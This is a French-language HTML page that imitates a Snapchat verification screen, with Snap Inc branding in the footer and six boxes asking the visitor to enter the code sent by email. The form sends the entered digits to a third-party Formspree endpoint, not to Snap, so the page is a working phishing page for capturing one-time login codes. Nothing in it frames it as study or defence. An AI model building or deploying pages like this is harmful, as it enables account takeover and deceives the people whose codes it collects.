<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Saisie du code</title>
  <style>
    * {
      box-sizing: border-box;
    }
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      font-family: Arial, sans-serif;
      background-color: #f9f9f9;
    }
    body {
      display: flex;
      flex-direction: column;
    }
    .content {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .code-box {
      background: #fff;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      text-align: center;
      max-width: 90%;
    }
    h2 {
      margin-bottom: 20px;
    }
    .code-inputs {
      display: flex;
      justify-content: center;
      gap: 8px;
      margin-bottom: 20px;
    }
    .code-inputs input {
      width: 35px;
      height: 45px;
      font-size: 20px;
      text-align: center;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #f7e000;
      color: #000;
      border: none;
      border-radius: 5px;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover {
      background-color: #e6d200;
    }
    footer {
      text-align: center;
      font-size: 0.8em;
      color: #888;
      padding: 15px 10px;
    }
    img {
      display: block;
      margin: 0 auto 15px auto;
      width: 150px;
    }
  </style>
</head>
<body>

<div class="content">
  <div class="code-box">
    <img src="logo.jpg" alt="Logo">
    <h2>Entrez votre code envoyé par mail</h2>

    <form action="https://formspree.io/f/xzzrqevd" method="POST" id="codeForm">
      <div class="code-inputs">
        <input type="text" name="code1" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
        <input type="text" name="code2" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
        <input type="text" name="code3" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
        <input type="text" name="code4" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
        <input type="text" name="code5" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
        <input type="text" name="code6" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
      </div>
      <button type="submit">Envoyer</button>
    </form>
  </div>
</div>

<footer>
  Société · Snap Inc · Carrières · Confidentialité · Conditions · Support · Marques · Découvrir · Publicité · Contacts
</footer>

<script>
  const inputs = document.querySelectorAll('.code-inputs input');

  inputs.forEach((input, index) => {
    input.addEventListener('input', () => {
      if (input.value.length === 1 && index < inputs.length - 1) {
        inputs[index + 1].focus();
      }
    });

    input.addEventListener('keydown', (e) => {
      if (e.key === "Backspace" && input.value === "" && index > 0) {
        inputs[index - 1].focus();
      }
    });
  });
</script>

</body>
</html>
